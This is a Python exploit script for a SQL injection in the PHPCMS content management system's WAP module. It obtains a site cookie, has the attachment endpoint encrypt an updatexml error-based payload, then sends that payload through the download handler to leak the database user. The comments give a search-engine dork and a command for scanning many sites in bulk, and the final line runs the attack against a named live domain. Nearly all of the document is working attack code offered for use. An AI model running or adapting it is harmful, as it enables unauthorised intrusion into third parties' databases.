# coding:utf-8
# phpcms wap SQL注入
# Test Url: http://www.ymtshipin.com
# spider  inurl:/index.php?m=content

#C:\Users\Administrator\Desktop\py\tools\ShellFramework>python3 framework.py -k "inurl:/index.php?m=content&c=index&a=show&catid=17&id=" -p 10 -e baidu -l phpcms_sql_wap -o phpcmsnew.txt


import requests
import re
from urllib.parse import quote
TIMEOUT = 3

def poc(url):
    #payload = "&id=%*27 and updat*exml(1,con*cat(1,(data*base())),1)%23&modelid=1&catid=1&m=1&f="
    payload = "&id=%*27 and updat*exml(1,con*cat(1,(us*er())),1)%23&modelid=1&catid=1&m=1&f="
    cookies = {}
    step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
    print(step1)
    for c in requests.get(step1, timeout=TIMEOUT).cookies:
        if c.name[-7:] == '_siteid':
            cookie_head = c.name[:6]
            cookies[cookie_head + '_userid'] = c.value
            cookies[c.name] = c.value
            print(cookies)
            break
    else:
        return False

    step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
    print(step2)
    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
        if c.name[-9:] == '_att_json':
            enc_payload = c.value
            print(c)
            break
    else:
        return False

    setp3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
    print(setp3)
    r = requests.get(setp3, cookies=cookies, timeout=TIMEOUT)
    return r.text


class Exploit:
    def attack(self, url):
        ret = poc(url)
        if ret:
            m = re.search(r'XPATH syntax error: (\S+) <br />', ret)
            if m:
                return url + "->" + m.group(1)


print(Exploit().attack('http://xiaobeike.creditease.cn/'))